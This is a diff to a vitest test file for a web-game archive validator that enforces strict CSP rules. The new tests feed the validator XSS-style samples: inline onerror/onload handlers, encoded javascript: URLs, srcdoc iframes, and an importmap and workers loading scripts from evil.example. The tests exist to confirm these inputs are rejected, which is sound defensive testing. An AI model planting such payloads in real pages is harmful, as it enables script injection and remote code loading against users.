@@ -1,7 +1,7 @@
 import {createHash} from 'node:crypto'
 import {gzipSync} from 'node:zlib'
 import {describe, expect, it} from 'vitest'
-import {assertStaticSvg, assertWebGameDocumentPolicy, isSvgMember, parseCspDirectives, WebGameContentPolicyError} from '../src/gubic/web-game-csp.js'
+import {assertNoRemoteWorkers, assertStaticSvg, assertWebGameDocumentPolicy, isSvgMember, parseCspDirectives, WebGameContentPolicyError} from '../src/gubic/web-game-csp.js'
 import {verifyWebGameArchive} from '../src/modules/github-release-sync-service.js'
 
 // GUBIC-P1 / Sentinel §16.6: the web-game ingestion CSP gate must parse the
@@ -33,18 +33,18 @@ function gameArchive(html: string, members: Record<string, string | Buffer> = {'
   return gzipSync(Buffer.concat([...Object.entries(files).map(([path, bytes]) => tarEntry(path, bytes)), tarEntry('game.files.json', inventory), Buffer.alloc(1024)]))
 }
 
-const STRICT = "default-src 'none'; script-src 'self'; connect-src 'none'; object-src 'none'"
+const STRICT = "default-src 'none'; script-src 'self'; connect-src 'none'; object-src 'none'; base-uri 'none'; worker-src 'none'"
 const meta = (policy: string) => `<meta http-equiv="Content-Security-Policy" content="${policy}">`
 const doc = (head: string, body = '<canvas></canvas><script src="main.js"></script>') =>
   `<!doctype html><html><head><meta charset="utf-8">${head}<title>Reference</title></head><body>${body}</body></html>`
 
 describe('GUBIC web game CSP gate', () => {
   it('accepts a valid restrictive CSP with local scripts, images and styles', () => {
-    const html = doc(meta(`${STRICT}; img-src 'self' data: blob:; style-src 'self'; media-src 'self'; base-uri 'none'; form-action 'none'`))
+    const html = doc(meta(`${STRICT}; img-src 'self' data: blob:; style-src 'self'; media-src 'self'; form-action 'none'`))
     expect(() => verifyWebGameArchive(gameArchive(html, {'main.js': 'const f = (x) => x * 2; window.evaluate = f; window.myeval = 1'}))).not.toThrow()
-    expect([...parseCspDirectives(STRICT).keys()]).toEqual(['default-src', 'script-src', 'connect-src', 'object-src'])
+    expect([...parseCspDirectives(STRICT).keys()]).toEqual(['default-src', 'script-src', 'connect-src', 'object-src', 'base-uri', 'worker-src'])
     // Single-quoted attribute, entity-encoded quotes and the bare legacy fixture form are equivalent.
-    expect(() => verifyWebGameArchive(gameArchive(`<meta http-equiv='content-security-policy' content="default-src &#39;none&#39;; script-src &apos;self&apos;; connect-src 'none'">`))).not.toThrow()
+    expect(() => verifyWebGameArchive(gameArchive(`<meta http-equiv='content-security-policy' content="default-src &#39;none&#39;; script-src &apos;self&apos;; connect-src 'none'; base-uri &#x27;none&#x27;; worker-src 'none'">`))).not.toThrow()
   })
 
   it("(a) rejects 'unsafe-eval'", () => {
@@ -116,7 +116,7 @@ describe('GUBIC web game CSP gate', () => {
     expect(() => assertWebGameDocumentPolicy(doc(meta(`${STRICT}; report-uri https://collector.example`)), 'index.html')).toThrow(/not permitted: report-uri/)
     expect(() => assertWebGameDocumentPolicy(doc(meta(`${STRICT}; img-src https://cdn.example`)), 'index.html')).toThrow(/remote or non-local/)
     expect(() => assertWebGameDocumentPolicy(doc(meta("default-src 'self'; script-src 'self'; connect-src 'none'")), 'index.html')).toThrow(/default-src 'none'/)
-    expect(() => assertWebGameDocumentPolicy(doc(meta("default-src 'none'; connect-src 'none'")), 'index.html')).toThrow(/script-src 'self'/)
+    expect(() => assertWebGameDocumentPolicy(doc(meta("default-src 'none'; connect-src 'none'; base-uri 'none'; worker-src 'none'")), 'index.html')).toThrow(/script-src 'self'/)
     expect(() => assertWebGameDocumentPolicy(doc(meta(`${STRICT}, script-src *`)), 'index.html')).toThrow(/single policy/)
     expect(() => assertWebGameDocumentPolicy(doc(meta("default-src 'none'; script-src 'self' 'wasm-unsafe-eval'; connect-src 'none'")), 'index.html')).toThrow(/wasm-unsafe-eval/)
   })
@@ -214,6 +214,74 @@ describe('GUBIC web game SVG members', () => {
     } catch (error) {
       expect(error).toBeInstanceOf(WebGameContentPolicyError)
       expect((error as WebGameContentPolicyError).code).toBe('GUBIC_SVG_ACTIVE_CONTENT')
+    }
+  })
+})
+
+// Sentinel CSP hardening for game documents.
+describe('GUBIC web game HTML hardening', () => {
+  const html = (body: string, head = meta(STRICT)) => gameArchive(doc(head, body))
+  const htmlRejection = (archive: Buffer) => {
+    try {
+      verifyWebGameArchive(archive)
+    } catch (error) {
+      return (error as Error).message
+    }
+    throw new Error('expected the document to be rejected')
+  }
+  const without = (directive: string) => STRICT.split('; ').filter((part) => !part.startsWith(directive)).join('; ')
+
+  it("requires base-uri 'none' and worker-src 'none'", () => {
+    expect(() => verifyWebGameArchive(html('<script src="main.js"></script>'))).not.toThrow()
+    expect(htmlRejection(html('', meta(without('base-uri'))))).toMatch(/must set base-uri 'none'/)
+    expect(htmlRejection(html('', meta(without('worker-src'))))).toMatch(/must set worker-src 'none'/)
+    expect(htmlRejection(html('', meta(`${without('base-uri')}; base-uri 'self'`)))).toMatch(/must set base-uri 'none'/)
+    expect(htmlRejection(html('', meta(`${without('worker-src')}; worker-src 'self'`)))).toMatch(/must set worker-src 'none'/)
+    expect(htmlRejection(html('', meta(`${without('base-uri')}; base-uri https://evil.example`)))).toMatch(/remote or non-local|base-uri 'none'/)
+  })
+
+  it('rejects inline on* event-handler attributes', () => {
+    for (const body of ['<img src="a.png" onerror="alert(1)">', '<body ONLOAD = x()>', '<canvas\n\tonclick=go()></canvas>', '<img/onerror=alert(1) src=x>', '<svg><rect onmouseover="x()"/></svg>']) {
+      expect(htmlRejection(html(body)), body).toMatch(/^\[GUBIC_HTML_ACTIVE_CONTENT\] .*inline event-handler attribute/)
+    }
+    // Text that merely mentions handlers, and handler-like words inside scripts, are fine.
+    expect(() => verifyWebGameArchive(html('<p>Press on to continue; set onload later.</p><script src="main.js"></script>'))).not.toThrow()
+    expect(() => verifyWebGameArchive(html('<script>window.addEventListener("load", () => { document.body.setAttribute("data-x", "<img onerror=1>") })</script>'))).not.toThrow()
+    expect(() => verifyWebGameArchive(html('<!-- <img onerror="x()"> --><script src="main.js"></script>'))).not.toThrow()
+  })
+
+  it('rejects javascript: URLs in any attribute, including encoded forms', () => {
+    for (const body of ['<a href="javascript:alert(1)">x</a>', '<a href=" JaVaScRiPt:alert(1)">x</a>', '<a href="java&#x09;script:alert(1)">x</a>',
+      '<form action="&#106;avascript:x()"></form>', '<button formaction="vbscript:x">x</button>', '<iframe src="javascript&colon;x"></iframe>', '<img srcset="a.png 1x, javascript:x 2x">']) {
+      expect(htmlRejection(html(body)), body).toMatch(/GUBIC_HTML_ACTIVE_CONTENT.*script URL/)
+    }
+    expect(() => verifyWebGameArchive(html('<p title="javascript is fun">tip: learn javascript: it is fun</p><a href="help.html">help</a>'))).not.toThrow()
+  })
+
+  it('rejects srcdoc documents', () => {
+    expect(htmlRejection(html('<iframe srcdoc="<p>hi</p>"></iframe>'))).toMatch(/GUBIC_HTML_ACTIVE_CONTENT.*srcdoc attribute/)
+    expect(htmlRejection(html('<iframe SRCDOC></iframe>'))).toMatch(/srcdoc/)
+  })
+
+  it('rejects <script type=importmap>', () => {
+    for (const tag of ['<script type="importmap">{"imports":{"a":"https://evil.example/a.js"}}</script>', '<script type=importmap>{}</script>', "<script TYPE=' ImportMap '>{}</script>"]) {
+      expect(htmlRejection(html(tag)), tag).toMatch(/GUBIC_HTML_ACTIVE_CONTENT.*importmap/)
+    }
+    expect(() => verifyWebGameArchive(html('<script type="module" src="main.js"></script>'))).not.toThrow()
+  })
+
+  it('rejects remote Worker, SharedWorker and serviceWorker registrations', () => {
+    const remote = ['new Worker("https://evil.example/w.js")', "new SharedWorker( '//evil.example/w.js')", 'new Worker(new URL(`https://evil.example/w.js`, import.meta.url))',
+      'navigator.serviceWorker.register("https://evil.example/sw.js")', "navigator.serviceWorker?.register('http://evil.example/sw.js')",
+      "navigator.serviceWorker['register']('//evil.example/sw.js')", 'new Worker("data:text/javascript,postMessage(1)")', 'new Worker("blob:https://x/1")',
+      "importScripts('https://evil.example/lib.js')"]
+    for (const code of remote) {
+      expect(htmlRejection(gameArchive(doc(meta(STRICT)), {'main.js': code})), code).toMatch(/^\[GUBIC_REMOTE_WORKER\] Web game script main\.js registers a non-local/)
+    }
+    expect(htmlRejection(html(`<script>${remote[3]}</script>`))).toMatch(/GUBIC_REMOTE_WORKER.*inline script/)
+    // Local workers are not "remote" (worker-src 'none' still stops them at runtime).
+    for (const code of ['new Worker("worker.js")', "new Worker(new URL('./worker.js', import.meta.url))", 'navigator.serviceWorker.register("/sw.js")', 'importScripts("lib.js")']) {
+      expect(() => assertNoRemoteWorkers(code, 'main.js'), code).not.toThrow()
     }
   })
 })
